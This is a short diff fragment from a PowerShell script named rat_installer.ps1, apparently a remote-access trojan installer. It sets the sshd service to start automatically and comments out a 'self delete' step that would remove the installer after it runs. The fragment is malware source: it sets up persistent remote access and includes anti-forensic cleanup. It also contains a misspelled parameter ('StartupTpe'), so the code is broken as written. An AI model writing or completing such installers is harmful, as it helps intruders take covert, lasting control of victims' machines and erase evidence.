@@ -60,5 +60,5 @@ Set-Service -Name sshd
 -StartupTpe 'Automatic'
 
 # self delete
-cd $initial_dir
-del rat_installer.ps1
+# cd $initial_dir
+# del rat_installer.ps1
